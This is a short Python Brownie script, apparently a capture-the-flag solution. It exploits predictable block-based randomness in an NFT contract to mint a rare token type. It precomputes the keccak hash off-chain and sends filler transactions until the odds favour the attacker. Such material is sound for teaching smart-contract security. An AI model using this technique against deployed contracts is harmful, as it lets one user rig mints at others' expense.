#!/usr/bin/python3
from brownie import interface, web3, accounts
from scripts.helpful_scripts import get_account
from colorama import Fore
from eth_abi import encode


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def test_NFT():
    nft = interface.INFT("0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC")

    # print(dir(nft))
    attacker = get_account()
    jadu = accounts[1]

    # print(attacker.address)
    # exit()
    nft_id = nft.id()
    # print(nft_id)

    for _ in range(100):
        encoded_data = encode(
            ["uint256", "address", "uint256"],
            [
                nft_id + 1,
                attacker.address,
                web3.eth.blockNumber,
            ],
        )
        u256 = web3.toInt(web3.keccak(encoded_data))

        # print(u256)
        if (u256 % 100) > 90:
            nft.mint({"from": attacker, "value": "1 ether"})
            print(u256 % 100)
            break
        else:
            # make some fake tx to increase the blockNumber
            jadu.transfer(attacker, "0.001 ether").wait(1)
    # print(attacker.balance())

    nft_id = nft.id()
    print(f"{green}NFT Id: {blue}{nft_id}")
    print(f"{green}NFT type: {blue}{nft.tokens(nft_id)}")

    assert nft.tokens(nft_id) == 3
